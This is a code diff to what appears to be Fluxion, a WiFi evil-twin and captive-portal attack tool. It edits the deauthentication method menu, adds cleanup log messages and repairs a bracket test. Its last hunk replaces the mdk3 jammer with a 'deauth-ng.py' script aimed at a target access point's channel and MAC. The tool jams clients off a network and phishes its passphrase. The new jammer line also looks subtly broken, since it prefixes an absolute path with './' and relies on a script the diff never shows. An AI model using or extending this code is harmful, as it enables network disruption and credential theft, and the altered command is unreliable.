@@ -152,9 +152,9 @@ captive_portal_set_ap_service() {
 fluxion_header
 
 echo -e "$FLUXIONVLine ${CClr}Select a method of deauthentication\n${CClr}"
-echo -e "${CSRed}[${CSYel}1${CSRed}]${CClr} mdk4${CClr}"
-echo -e "${CSRed}[${CSYel}2${CSRed}]${CClr} aireplay${CClr}"
-echo -e "${CSRed}[${CSYel}3${CSRed}]${CClr} mdk3\n${CClr}"
+echo -e "${CSRed}[${CSYel}1${CSRed}]${CClr} mdk4 (${CGrn}recommended$CClr)${CClr}"
+echo -e "${CSRed}[${CSYel}2${CSRed}]${CClr} aireplay-ng${CClr}"
+echo -e "${CSRed}[${CSYel}3${CSRed}]${CClr} deauth-ng.py (Python-based)${CClr}\n${CClr}"
 read -p $'\e[0;31m[\e[1;34mfluxion\e[1;33m@\e[1;37m'"$HOSTNAME"$'\e[0;31m]\e[0;31m-\e[0;31m[\e[1;33m~\e[0;31m] \e[0m' option_deauth
 
 
@@ -564,6 +564,9 @@ captive_portal_get_MAC_brand() {
 
 
 captive_portal_unset_attack() {
+  # Enhanced cleanup with better error handling
+  echo "Cleaning up captive portal attack resources..." > $FLUXIONOutputDevice
+  
   sandbox_remove_workfile \
     "$FLUXIONWorkspacePath/captive_portal_authenticator.sh"
   sandbox_remove_workfile \
@@ -574,9 +577,12 @@ captive_portal_unset_attack() {
   sandbox_remove_workfile "$FLUXIONWorkspacePath/captive_portal"
 
   # Only reset the AP if one has been defined.
-  if [ "$CaptivePortalAPService" && "$(type -t ap_service_reset)" ]]; then
+  if [ "$CaptivePortalAPService" ] && [ "$(type -t ap_service_reset)" = "function" ]; then
+    echo "Resetting AP service..." > $FLUXIONOutputDevice
     ap_service_reset
   fi
+  
+  echo "Captive portal cleanup completed." > $FLUXIONOutputDevice
 }
 
 # Create different settings required for the script
@@ -1520,7 +1526,7 @@ start_attack() {
 
 	xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg black -fg "#FF0009" \
         -title "FLUXION AP Jammer Service [$FluxionTargetSSID]" -e \
-        "mdk3 $CaptivePortalJammerInterface d -c $FluxionTargetChannel -b \"$FLUXIONWorkspacePath/mdk4_blacklist.lst\"" &
+        "./$FLUXIONWorkspacePath/captive_portal/deauth-ng.py -i $CaptivePortalJammerInterface -c $FluxionTargetChannel -a $FluxionTargetMAC" &
         # Save parent's pid, to get to child later.
     	CaptivePortalJammerServiceXtermPID=$!
   fi
